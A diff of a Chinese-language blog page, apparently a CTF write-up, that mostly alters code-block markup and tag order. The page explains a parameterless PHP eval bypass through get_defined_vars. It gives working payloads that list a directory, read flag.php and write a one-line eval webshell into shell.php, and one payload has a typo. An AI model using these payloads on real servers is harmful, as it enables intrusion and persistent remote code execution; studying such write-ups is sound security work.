@@ -31,8 +31,8 @@
 <meta property="article:published_time" content="2021-10-21T16:00:00.000Z">
 <meta property="article:modified_time" content="2021-10-22T12:53:28.753Z">
 <meta property="article:author" content="xu">
-<meta property="article:tag" content="RCE">
 <meta property="article:tag" content="特殊姿势">
+<meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/43690b58c8aa4c3ab18760454c490182.png">
   
@@ -255,18 +255,18 @@
               <p>昨天做了一个无参数注入RCE的题，学到后面突然觉得可以做一些有趣的事<br>然后就尝试做了一下，发现可以利用相关漏洞写一个一句话木马<br>今天来总结一下</p>
 <span id="more"></span>
 <p>以下是源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>); <br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//2.php</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>); <br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//2.php</span><br></code></pre></div></td></tr></table></figure>
 <p>以下是我的目录，可以看到flag.php就在当前目录下<br><img src="https://img-blog.csdnimg.cn/43690b58c8aa4c3ab18760454c490182.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">先说说怎么做吧，再重点讲一讲原理<br>这是我的getshell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">val(end(current(get_defined_vars())));&amp;b=system(&#x27;echo &quot;&lt;?php @eval(_POST[shell]);?&gt;&quot;&gt;&gt;shell.php&#x27;);<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs url">val(end(current(get_defined_vars())));&amp;b=system(&#x27;echo &quot;&lt;?php @eval(_POST[shell]);?&gt;&quot;&gt;&gt;shell.php&#x27;);<br></code></pre></div></td></tr></table></figure>
 <p>这里主要是用了get_defined_vars的特性</p>
 <p>首先,下面这玩意儿作用是把$b里面的变量给他eval(),相当于下面的作用是eval(phpinfo())</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">eval(end(current(get_defined_vars())));&amp;b=phpinfo();<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs url">eval(end(current(get_defined_vars())));&amp;b=phpinfo();<br></code></pre></div></td></tr></table></figure>
 <p>最后的结果如下，很正确吧(关于为啥是这样我也就不说了，网上搜无参数RCE，一大把介绍，我会再文末附上两个我学习的帖子，大火可以参考)<br><img src="https://img-blog.csdnimg.cn/ef2b2894d20c4f69a3f7f5b429a13c05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">既然b的内容可以直接输出，那么我们让b=system()<br>那么可操作的空间就变大了</p>
 <p>咱们直接来一手b=system(‘dir’),咱们看看效果<br><img src="https://img-blog.csdnimg.cn/06da1a18f13e427581e4fa038bcfa592.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">直接干出来了目录下的文件</p>
 <p>那么思路就清晰了，现在我们只需要b=system(‘type flag.php’)那么flag就出来了(主要要用源码查看，否则有特殊字符不显示)<br><img src="https://img-blog.csdnimg.cn/76a81d7248f64c75a4bc930921241a29.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>但这不是我们讲的重点，如果说flag.php不在当前目录呢，我们也有其他方法去做，但是如果直接写一句话，不就更简单了嘛，</p>
 <p>直接再system里面放下面这段，一句话木马直接出来了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">echo &quot;&lt;?php @eval(_POST[shell]);?&gt;&quot;&gt;&gt;shell.php<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs url">echo &quot;&lt;?php @eval(_POST[shell]);?&gt;&quot;&gt;&gt;shell.php<br></code></pre></div></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/5ca6d8482fa7490fb47e776546b8750c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>原理特别简单，我也只是学习到了，突然想到了其他方式，特意来记录下来</p>
 <p>然后相关无参数绕过的方式下面有俩大佬写的，我觉得很容易懂，写的很好推荐给大家</p>
@@ -282,9 +282,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/RCE/">RCE</a>
-                    
                       <a class="hover-with-bg" href="/tags/%E7%89%B9%E6%AE%8A%E5%A7%BF%E5%8A%BF/">特殊姿势</a>
+                    
+                      <a class="hover-with-bg" href="/tags/RCE/">RCE</a>
                     
                   </div>
                 
